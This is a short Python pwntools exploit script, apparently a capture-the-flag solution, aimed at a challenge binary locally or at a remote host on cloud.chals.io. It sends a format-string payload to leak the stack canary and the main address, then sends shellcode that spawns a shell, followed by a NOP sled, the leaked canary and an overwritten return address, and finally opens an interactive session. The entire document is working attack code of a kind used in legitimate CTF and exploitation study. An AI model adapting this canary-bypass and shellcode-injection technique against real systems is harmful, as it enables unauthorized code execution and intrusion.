from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
continue
'''


def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('0.cloud.chals.io', 12185)
    else:
        return process(e.path)


def ret_leaks():
    p.recvuntil(b'This might help you out:')
    stack = int(p.recvline().strip(b'\n'), 16)
    p.sendline(b'%15$p.%19$p')
    leaks = p.recv().split(b'.')
    canary = int(leaks[0], 16)
    main = int(leaks[1], 16)
    return stack, canary, main


def send_sploit(canary, stack):
    shellcode = asm(shellcraft.sh())
    print(disasm(shellcode))
    nop_sled = (72-len(shellcode))*asm(shellcraft.nop())
    shell = shellcode + nop_sled
    p.sendline(shell+p64(canary)+cyclic(8)+p64(stack))


p = start()

stack, canary, main = ret_leaks()
e.address = main - e.sym['main']
log.info("[+] Stack %s " % hex(stack))
log.info("[+] Canary %s " % hex(canary))
log.info("[+] Base %s " % hex(e.address))

send_sploit(canary, stack)

p.interactive()
